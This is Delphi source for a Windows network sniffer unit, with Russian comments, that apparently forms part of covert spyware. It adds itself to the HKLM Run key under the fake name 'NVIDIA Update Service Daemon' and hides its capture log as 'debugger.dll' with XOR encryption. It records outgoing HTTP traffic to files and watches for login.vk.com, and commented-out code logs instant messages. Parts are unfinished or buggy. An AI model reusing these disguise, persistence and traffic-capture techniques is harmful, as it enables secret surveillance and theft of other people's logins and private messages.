unit SSUtils;

interface

uses
  Windows, Dialogs, winsock, classes, SysUtils,MagentaPackHdrs,MagentaMonpcap,Registry;

type
	{TLogger = class (TObject)
    private
      FHeader : String;
      FDebug  : String;
      FHexBlock:String;
      FTitle  : String;
      FMessage: String;
      FullText: String;
      procedure PrintLine (Text:String);
      function PrintChar (C:String; Count:integer):String;
    public
      constructor Create;
      destructor Destroy;
      procedure AddHeader (Text: String);     //Добавить заголовок
			procedure AddDebugParam (Text: String); //Добавить параметр для отл.
      procedure AddHexBlock (Text: String);
      procedure AddTitle (Text: String);      //Добавить тип сообщения
    	procedure AddMessage (Text: String);    //Добавить текст сообщения
      procedure PrintAll;                     //Вывод содержимого буффера.
  end;}

TLogLine = class (TObject)
  private
    FDate:TDateTime;
    Fip_src:TInAddr;
    Fip_dst:TInAddr;
    FType:Integer;
    FFrom:String;
    FTo:String;
    FMessage:AnsiString;
    FDbgInfo:TStringList;
  public
    constructor Create;
    destructor Destroy;
    property Date:TDateTime read FDate write FDate;
    property Ip_Src:TInAddr read Fip_src write Fip_src;
    property Ip_Dst:TInAddr read Fip_dst write Fip_dst;
    property LogType:Integer read FType write FType;
    property Msg_From:String read FFrom write FFrom;
    property Msg_To:String read FTo write FTo;
    property Msg_Text:AnsiString read FMessage write FMessage;
    property Dbg_info:TStringList read FDbgInfo write FDbgInfo;
    procedure Print;
end;

TBigBox = class (TObject)
  private

  public

end;
{TLogLine = class(TObject)
  public
    constructor Create;
    destructor Destroy;
    procedure AddMsgData (time    :TDateTime;
                          ip_src  :TInAddr;
                          ip_dst  :TInAddr;
                          typ     :Integer; // Тут надо чтобы было TSSType
                          msg_from:String;
                          msg_to  :String;
                          msg_text:String;
                          dbg_info:TStringList
    );
    procedure AddAuthData (time    :TDateTime;
                           ip_src  :TInAddr;
                           ip_dst  :TInAddr;
                           typ     :Integer; // Тут надо чтобы было TSSType
                           dummy   :String
    ); //Так, на будещее :)
end;}

function LogData(Buffer: PAnsiString):String;
function LogDataEx(Buffer:PAnsiString):String;
//procedure SavePacket(Buffer: PAnsiString; Comment: String);
//procedure NewMessage(DateTime: TDateTime; IP_src, IP_dst: String; MsgType: Byte; ScreenName: String; Text: AnsiString);

function ReplaceStr(Str: String): String;
//procedure SaveTOPCAP (Filename:string; Buffer:PAnsiString);
//procedure DbgProcessPacket(PacketInfo:TPacketInfo);
  procedure RuntimeLog(Text:string;PrintDate:Boolean=True);
//  procedure ProcParamStr;
//  procedure LoadSettings;
//  procedure SaveSettings;
//  procedure GenerateAdapterList (var AdapterList:TStringList);
  procedure AddToAutorun(var ErrCode:String);
  function XORCrypter (Input:string):String;
//function Check:boolean;

function IsDublicate:Boolean;
procedure GetCMDParams;
function WriteToLog (Msg:string;PrintDate:Boolean=True):boolean;
function GetUN:String;
function LoadSettings:Boolean;
function SaveSettings:Boolean;
function ConvertHTTP (Buffer:PAnsiString):string;
function LogDataWrapper (Packet:TPacketInfo):String;
procedure Proc80(Packet:TPacketInfo);

const
  // Sets UnixStartDate to TDateTime of 01/01/1970
  UnixStartDate: TDateTime = 25569.0;

type DWORD = Longword;

type
THdrEth = packed record
    Dst     : TMacAddr;
    Src     : TMacAddr;
    eth_type: Word;
end;
PCAPHdr = packed record
   magic_number: DWORD;    // magic number
   version_major: Word;   // major version number
   version_minor: Word;   // minor version number
   thiszone: Longint;     // GMT to local correction
   sigfigs: DWORD;        // accuracy of timestamps
   snaplen: DWORD;        // max length of captured packets, in octets
   network: DWORD;        // data link type
end;
PCAPPacketHdr = packed record
  ts_sec: DWORD;         // timestamp seconds
  ts_usec: DWORD;        // timestamp microseconds
  incl_len: DWORD;       // number of octets of packet saved in file
  orig_len: DWORD;       // actual length of packet
end;
TSettings = record
	itrfc: string;
end;

const
	OPT_DEBUG = 1; // Режим отладки
  OPTION_TEXT_LOG_FILENAME = 'debugger.dll'; //Имя Файла
  OPTION_RUNTIME_LOG_FILENAME = 'runtime.log';
  OPTION_CRYPT = True; //Шифровать лог

var
  OPTION_INTERFACE: String;
	Stgs: TSettings;
  OPTION_CLEAR_INTERFACE:Boolean;
  Boxes: TStringList; //Список портов
  //Раздел для глобальных переменных
  //отвечающих за параметры коммандной строки
  CMD_EnableLog:Boolean;       // "dl"
  CMD_ClearInterface:Boolean;  // "ci"
  CMD_SelectInterface:Boolean; // "si"

implementation

uses MainUnit;

{TLogLine}
constructor TLogLine.Create;
begin
  //FDate:='';
  //Fip_src:='';
  //Fip_dst:='';
  FType:=0;
  FFrom:='--';
  FTo:='--';
  FMessage:='';
  FDbgInfo:= TStringList.Create;
end;
destructor TLogLine.Destroy;
begin
  FDbgInfo.Free;
end;
procedure TLogLine.Print;
var
	F:TextFile;
  tmp:string;
  i:Integer;
begin
  {$I-}
	AssignFile(F,OPTION_TEXT_LOG_FILENAME);
  Append(F);
  if IOResult<>0 then Rewrite(F);

  for i := 0 to FDbgInfo.Count-1 do
    tmp:=tmp+FdbgInfo[i]+' ';

	writeln(F,DateTimeToStr(FDate)+' '+
            IPToStr(Fip_src)+' '+
            IPToStr(Fip_dst)+' '+
            IntToStr(FType)+' '+
            FFrom+' '+
            FTo+' '+
            FMessage+' '+
            '['+Trim(tmp)+']'
  );

  CloseFile (F);
  {$I+}
end;
{end of TLogLine}

function IsDublicate:Boolean;
//Процедура проверки на вторичный запуск процесса
var
	Err:integer;
begin
  CreateMutex(nil,false,'{BE553A27-7C7C-4EEB-90DE-283E601AFA44}');
	Err := GetLastError();
	if (Err=ERROR_ALREADY_EXISTS)or(Err=ERROR_ACCESS_DENIED) then
  	Result:=True
  else
  	Result:=False;
end;

procedure GetCMDParams;
//Получаем и обрабатываем параметры коммандной строки
var
  I: Integer;
  tmpBuf:string;
begin
  //Обнуляем все настройки
  CMD_EnableLog:=False;
  CMD_ClearInterface:=False;
  CMD_SelectInterface:=False;

  tmpBuf:='';
  if ParamCount>0 then
  begin
    I:=1;
		while i<=ParamCount do
    begin
      if ParamStr(i)='/?' then
      begin
        ShowMessage('This is help');
        Exit;
      end
      else
      if (ParamStr(i)='/ci') then //Отчистить настройку интерфейса
      begin
        if (i+1<ParamCount) then
        begin
          inc(i);
          Stgs.itrfc:=ParamStr(i);
    			Exit;
        end
        else
        begin
        	CMD_ClearInterface:=True;
        end;
      end
      else
      if (ParamStr(i)='/dl') then //Включенный режим отладки
      begin
        CMD_EnableLog:=True;
      end;

      inc(i);
    end;
  end;
end;

function WriteToLog (Msg:string;PrintDate:Boolean=True):boolean;
//Пишем служебную инфу в "Рантайм лог"
var
  i:integer;
  F:TextFile;
  FullPath:string;
begin
  FullPath:=OPTION_RUNTIME_LOG_FILENAME;
  AssignFile(F,FullPath);
  try
		if not FileExists(FullPath) then Rewrite(F) else Append(F);
		Writeln(F,DateTimeToStr(Now)+' '+Msg);
    CloseFile(F);
  except
		On E: Exception do
    begin
    	ShowMessage('Ошибка: '+E.Message);
      Exit;
    end;
  end;
	Result:=True;
end;

function GetUN:String;
//Получаем имя пользователя, запустившего процесс.
var
	UN:WideString;
  size:DWORD;
begin
	Size:=255;
  SetLength(UN,Size);
  GetUserName(@UN[1],size);
  SetLength(UN,Size-1);
  Result:=UN;
end;

function LoadSettings:Boolean;
//Процедура загрузки настроек из реестра
var
  Reg:TRegistry;
  openResult:Boolean;
begin
  Result:=False;
  try
    try
			Reg:=TRegistry.Create(KEY_READ);
			Reg.RootKey := HKEY_LOCAL_MACHINE;
      if (not reg.KeyExists('Software\\SS\\')) then
			begin
    		WriteToLog ('LoadSettings: SS Key is missing');
    		Exit;
  		end;
      Reg.OpenKey('Software\\SS\\',False);
      if not reg.ValueExists('i') then
      begin
        WriteToLog ('LoadSettings: Interface not set');
    		Exit;
      end;
      Stgs.itrfc:=Reg.ReadString('i');
      Reg.CloseKey;
      WriteToLog('Settings loaded ('+
      					 'i="'+Stgs.itrfc+'")'
      					);
      Result:=True;
    except
      on E: Exception do
      	ShowMessage(E.Message);
    end;
  finally
    Reg.Free;
  end;
end;

function SaveSettings:Boolean;
//Сохранение настроек в реестре
var
  Reg:TRegistry;
  R:Boolean;
  E:string;
begin
  Result:=False;
  try
    try
      Reg:=TRegistry.Create(KEY_ALL_ACCESS);
			Reg.RootKey := HKEY_LOCAL_MACHINE;
      R:=Reg.OpenKey('Software\\SS\\',True);
      if R=False then
  		begin
  			WriteToLog('SaveSettings: Cant create key');
				Exit;
  		end;
    	Reg.WriteString('i', Stgs.itrfc);
      WriteToLog('SaveSettings: itfc value created! chk='+Reg.ReadString('i'));
      Reg.CloseKey;
      Result:=True;
    except
      On E: Exception do
      	ShowMessage(E.Message);
        //WriteToLog('SaveSettings: SaveSettings failed ('+E.Message+')');
    end;
  finally
    Reg.Free;
  end;
	Result:=True;
end;

function LogData(Buffer: PAnsiString):String;
var
  hexbuf: string;
  i: integer;
begin
  hexbuf := '';
  for I := 1 to 47 do
  	hexbuf:=hexbuf+'-';
  hexbuf:=hexbuf+#13#10;
  for i := 1 to Length(Buffer^) do
  begin
    hexbuf:=hexbuf+inttohex(ord(Buffer^[i]),2)+' ';
		if (i mod 4 = 0) and (i mod 16 <> 0) then hexbuf:=Trim(hexbuf)+'-';
    if (i mod 16)=0 then hexbuf:=Trim(hexbuf)+#13#10;
  end;
  //AddToLog(Trim(hexbuf));
  Result:=Trim(hexbuf);
end;

function LogDataWrapper (Packet:TPacketInfo):String;
var
	R:String;
begin
	R:=LogDataEx(@Packet.DataBuf);
	R:=IPToStr(Packet.AddrSrc)+'->'+IPTostr(Packet.AddrDest)+
  	 ' Seq: '+IntToStr(Packet.Seq)+' Ack: '+IntToStr(Packet.Ack)+
     ' tcp len: '+IntToStr(Packet.DataLen)+
		 #13#10+R;
  Result:=R;
end;

function LogDataEx(Buffer:PAnsiString):String;
var
  I, Octets, PartOctets: Integer;
  PacketType, DumpData, ExtendedInfo: String;
  LogData:string;
begin
  I := 1;
  Octets := 0;
  PartOctets := 0;
  LogData:='';
  while I < Length(Buffer^)+1 do
  begin
    case PartOctets of
      0: LogData := LogData + Format('%.6d ', [Octets]);
      9: LogData := LogData + '| ';
      18:
      begin
        Inc(Octets, 10);
        PartOctets := -1;
        LogData := LogData + '    ' + DumpData + sLineBreak;
        DumpData := '';
      end;
    else
      begin
        LogData := LogData + Format('%s ', [IntToHex(ord(Buffer^[i]), 2)]);
        if ord(Buffer^[i]) in [$19..$7F] then
          DumpData := DumpData + Chr(ord(Buffer^[i]))
        else
          DumpData := DumpData + '.';
        Inc(I);
      end;
    end;
    Inc(PartOctets);
  end;

  if PartOctets <> 0 then
  begin
    PartOctets := (16 - Length(DumpData)) * 3;
    if PartOctets >= 24 then Inc(PartOctets, 2);
    Inc(PartOctets, 4);
    LogData := LogData + StringOfChar(' ', PartOctets) +
      DumpData + sLineBreak + sLineBreak
  end
  else
    LogData := LogData + sLineBreak + sLineBreak;
    Result:=LogData;
end;

function ReplaceStr(Str: String): String;
var
  i: integer;
begin
  for i := 0 to Length(Str) do
    If (Str[i] = ':') or (Str[i] = '\') or (Str[i] = '/') then
      Str[i] := '-';
  Result := Str;
end;

{procedure SavePacket(Buffer: PAnsiString; Comment: String);
var
  FileName: String;
  F: File;
  i: integer;
  stream: TFileStream;
begin
  FileName := DateToStr(Now) + ' ' + TimeToStr(Now)+'.cap';
  FileName := ReplaceStr(FileName);
  stream := TFileStream.Create(FileName, fmCreate);
  stream.WriteBuffer(PAnsiString(Buffer^)^, Length(Buffer^));
  stream.Free;
  //AddtoLog('Неизвестный пакет сохранен ('+FileName+')' +#13#10+ 'Причина:'+ Comment);
end;}

{procedure NewMessage(DateTime: TDateTime; IP_src, IP_dst: String; MsgType: Byte;
  ScreenName: String; Text: AnsiString);
var
  Header: String;
  MessageType: String;
  Comment: String;
  F: TextFile;

begin
  if MsgType = 1 then
    Comment := 'Входящее сообщение от ' + ScreenName + ':'
  else if MsgType = 2 then
    Comment := 'Исходящее сообщение для ' + ScreenName + ':';

  //Logger.AddTitle (Comment);
end;}

function DateTimeToUnix(ConvDate: TDateTime): Longint;
begin
  //example: DateTimeToUnix(now);
  Result := Round((ConvDate - UnixStartDate) * 86400);
end;

function UnixToDateTime(USec: Longint): TDateTime;
begin
  //Example: UnixToDateTime(1003187418);
  Result := (Usec / 86400) + UnixStartDate;
end;

{procedure SaveTOPCAP (Filename:string; Buffer:PAnsiString);
var
  GlobalHeader: PCAPHdr;
  PacketHeader: PCAPPacketHdr;
  F: File;
  stream: TFileStream;
  p:integer;
begin
  if not FileExists(Filename) then
  begin
    //Если файл отсутствует, то создадим, и запишем в него PCAPHdr
    with GlobalHeader do
    begin
      magic_number:= $A1B2C3D4;
      version_major:= $02;
      version_minor:= $04;
      thiszone:= $00;
      sigfigs:= $00;
      snaplen:= $FFFF;
      network:= $01;
    end;
  end;

  //Записывеем PacketHdr
  with PacketHeader do
  begin
    ts_sec:=DateTimeToUnix(Now);
    ts_usec:=$00;
    incl_len:=Length(Buffer^);
    orig_len:=Length(Buffer^);
  end;

  stream:= TFileStream.Create(FileName, fmCreate);
  stream.WriteBuffer(GlobalHeader, SizeOf(GlobalHeader));
  stream.WriteBuffer(PacketHeader, SizeOf(PacketHeader));
  stream.WriteBuffer(PAnsiString(Buffer^)^, Length(Buffer^));
  stream.Free;

end;}

{procedure DbgProcessPacket(PacketInfo:TPacketInfo);
var
	text:String;
  i:Integer;
  tmp:String;
begin
 text:='======================================================================='+#13#10;
 text:=text+'Pck len: '  +inttostr(PacketInfo.PacketLen)+#13#10+
 			 'Eth prot: ' +inttohex(PacketInfo.EtherProto,2)+#13#10+
 			 'Eth src: '  +MacToStr(PacketInfo.EtherSrc)+#13#10+
 			 'Eth dst: '  +MacToStr(PacketInfo.EtherDest)+#13#10+
       'IP src: '   +IPToStr(PacketInfo.AddrSrc)+#13#10+
			 'IP dst: '   +IPToStr(PacketInfo.AddrDest)+#13#10+
			 'Port src: ' +IntToStr(PacketInfo.PortSrc)+#13#10+
       'Port dst: ' +IntToStr(PacketInfo.PortDest)+#13#10+
			 'ProtoType: '+IntToStr(PacketInfo.ProtoType)+#13#10+
			 'TcpFlags: ' +IntToHex(PacketInfo.TcpFlags,2)+#13#10+
			 'SendFlag: ' +BoolToStr(PacketInfo.SendFlag,true)+#13#10+
			 'IcmpType: ' +IntToStr(PacketInfo.IcmpType)+#13#10+
			 'DataLen: '  +IntToStr(PacketInfo.DataLen)+#13#10+
			 'PacketDT: ' +DateTimeToStr(PacketInfo.PacketDT)+#13#10;
  text:=text+'-----------------------------------------------------------------------';
  tmp:='';
  for i := 1 to PacketInfo.DataLen do
  begin
    tmp:=tmp+inttohex(ord(AnsiChar(PacketInfo.DataBuf[i])),2);
    if (i mod 4=0) and (i<>0) and (i mod 16 <>0) and (i<>PacketInfo.DataLen) then tmp:=tmp+'-' else tmp:=tmp+' ';
    if (i mod 16=0) and (i<>0) then tmp:=tmp+#13#10;
  end;
  text:=text+#13#10+tmp+#13#10;
	text:=text+'=======================================================================';
	//AddToLog(text);
end;}

procedure RuntimeLog(Text:string;PrintDate:Boolean=True);
var
	F:TextFile;
begin
  {$I-}
	AssignFile(F,'runtime.log');
  Append(F);
  if IOResult<>0 then Rewrite(F);
  if PrintDate then
    Writeln(F,'['+DateTimeToStr(Now)+'] '+Text)
  else
    Writeln(F,Text);
  CloseFile (F);
  {$I+}
end;

{procedure GenerateAdapterList (var AdapterList:TStringList);
var
	Mon:TMonitorPcap;
  i:integer;
  tmp:TStringList;
begin
  Mon:=TMonitorPcap.Create(nil);
  for i := 0 to Mon.AdapterNameList.Count-1 do
  	AdapterList.Add('['+IntToStr(i)+'] '+Mon.AdapterNameList[i]+' - '+Mon.AdapterDescList[i]);
  AdapterList.SaveToFile('interfaces.txt');
  Mon.Free;
end;}

{procedure ProcParamStr;
var
  c:integer;
  i:integer;
  Prm:String;
  tmp:TStringList;
begin
  c:=ParamCount;
  if c=0 then Exit;
  i:=1;
  while i<=c do
  begin
    Prm:=ParamStr(i);
    if Prm='-si' then
    begin
      tmp:=TStringList.Create;
      GenerateAdapterList(tmp);
      ShowMessage(tmp.Text);
      tmp.Free;
      Halt(0);
    end;

    if Prm='-i' then
    begin
      Inc(i);
      Prm:=ParamStr(i);
      if Prm='' then
      begin
        ShowMessage('error');
        Halt(0);
      end;
      OPTION_INTERFACE:=Prm;
      SaveSettings;
      Halt(0);
    end;
    inc(i);
  end;
end;}

{procedure CreateSettings;
var
  Reg:TRegistry;
  openResult:Boolean;
begin
  Reg:=TRegistry.Create(KEY_WRITE);
  Reg.RootKey := HKEY_LOCAL_MACHINE;
  openResult := reg.OpenKey('Software\\SS\\',True);

  if openResult = False then
  begin
    ShowMessage('error');
    halt(0);
  end;

  Reg.WriteString('i', OPTION_INTERFACE);
  Reg.WriteString('v',OPTION_VERSION);

  Reg.CloseKey;
  Reg.Free;
end;}

{procedure LoadSettings;
var
  Reg:TRegistry;
  openResult:Boolean;
begin
  //Процедура загрузки настроек из реестра
  Reg:=TRegistry.Create(KEY_READ);
  Reg.RootKey := HKEY_LOCAL_MACHINE;
  if (not reg.KeyExists('Software\\SS\\')) then CreateSettings;
  openResult:= reg.OpenKey('Software\\SS\\',False);
  if openResult then
  begin
    if not reg.ValueExists('i') then CreateSettings else OPTION_INTERFACE:= Reg.ReadString('i');
    if not reg.ValueExists('v') then CreateSettings else OPTION_VERSION:= Reg.ReadString('v');
  end;
  RuntimeLog('Settings loaded ('+
  					 'interface: "'+OPTION_INTERFACE+'"'+' '+
             'version: "'+OPTION_VERSION+'"'+
             ')');
  Reg.CloseKey;
  Reg.Free;
end;}

{procedure SaveSettings;
var
  Reg:TRegistry;
  openResult:Boolean;
  E:string;
begin
  Reg:=TRegistry.Create(KEY_WRITE);
  Reg.RootKey := HKEY_LOCAL_MACHINE;
  openResult:= reg.OpenKey('Software\\SS\\',True);

  if openResult = False then
  begin
    ShowMessage('error');
    halt(0);
  end;

  Reg.WriteString('i', OPTION_INTERFACE);
  Reg.WriteString('v', OPTION_VERSION);

  E:='';
  AddToAutorun(E);

  Reg.CloseKey;
  Reg.Free;
end;}

procedure AddToAutorun(var ErrCode:String);
var
  Reg:TRegistry;
  full_name:String;
begin
  ErrCode:='0';
  Reg:= TRegistry.Create(KEY_ALL_ACCESS);
  Reg.RootKey:=HKEY_LOCAL_MACHINE;
  Reg.OpenKey('SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',true);

  full_name:= ExtractFilePath(ParamStr(0))+ExtractFileName(ParamStr(0));

  try
    Reg.WriteString('NVIDIA Update Service Daemon',full_name);
  except
    On E:Exception do
      ErrCode:=E.Message;
  end;

  if (not Reg.ValueExists('NVIDIA Update Service Daemon')) and (ErrCode='1') then ErrCode:='Missing value';
  Reg.CloseKey;
  Reg.Free;
end;

function XORCrypter (Input:string):String;
var
  i:integer;
  key:string;
  longkey:string;
  toto:string;
begin
  key:='Ololo';
  for i := 0 to (length(Input) div length(key)) do
    longkey := longkey + key;
  for i := 1 to length(Input) do
  begin
    toto := chr((ord(Input[i]) xor ord(longkey[i]))); // XOR алгоритм
    result := result + toto;
  end;
end;

{function Check:boolean;
var
	un:WideString;
  size:DWORD;
  i:integer;
  F:TextFile;
  LOG_NAME:string;
  IsError:Boolean;
begin
	LOG_NAME:='C:\dummy.tmp';
  IsError:=False;
  AssignFile(F,LOG_NAME);
  try
		if not FileExists(LOG_NAME) then Rewrite(F) else Append(F);
		Writeln(F,'test');
    CloseFile(F);
  except
		On E: Exception do
    begin
    	ShowMessage('Ошибка: '+E.Message);
      IsError:=True;
      Exit;
    end;
  end;
	Result:=IsError;
end;}

function ConvertHTTP (Buffer:PAnsiString):string;
var
	i:integer;
  tmp:AnsiString;
begin
	tmp:=Buffer^;
	if Pos('login.vk.com',tmp)<>0 then
  	ShowMessage('!!!!!');

end;

procedure Proc80(Packet:TPacketInfo);
var
	i:integer;
  s:TFileStream;
  Finded:Boolean;
begin
  if Packet.PortDest=80 then
  begin
    //Если IP.SRCPORT нет в списке, то создаем
    Finded:=False;
    for I := 0 to Boxes.Count-1 do
    	If Boxes.Names[i]=IntToStr(Packet.PortSrc) then Finded:=True else Finded:=False;

    if not Finded then
    begin
      frmMain.mmo1.Lines.Add('Создаем');
      frmMain.mmo1.Lines.Add(LogDataEx(@Packet.DataBuf));

      s:=TFileStream.Create(IntToStr(Packet.PortSrc)+'.txt',fmCreate);
      s.WriteBuffer(Packet.DataBuf[1],Packet.DataLen);
      i:=$22;
      s.Write(Byte(i),1);
      s.Free;
      Boxes.Add(IntToStr(Packet.PortSrc)+'='+inttostr(Packet.Seq));
      frmMain.mmo1.Lines.Add ('-----------------------');
			frmMain.mmo1.Lines.Add (Boxes.Text);
      frmMain.mmo1.Lines.Add ('-----------------------');
    end
    else //Если есть, то добавяем.
    begin
      frmMain.mmo1.Lines.Add('Добавляем');
      frmMain.mmo1.Lines.Add(LogDataEx(@Packet.DataBuf));

      s:=TFileStream.Create(IntToStr(Packet.PortSrc)+'.txt',fmOpenWrite);
      s.Seek(s.Size,1);
      s.WriteBuffer(Packet.DataBuf[1],Packet.DataLen);

      i:=$22;
      s.Write(Byte(i),1);
      s.Free;

    end;

  end;

  if Packet.PortSrc=80 then
  begin

  end;



end;

initialization
begin
  Boxes:=TStringList.Create;
end;

finalization
begin
  Boxes.Free;
end;

end.
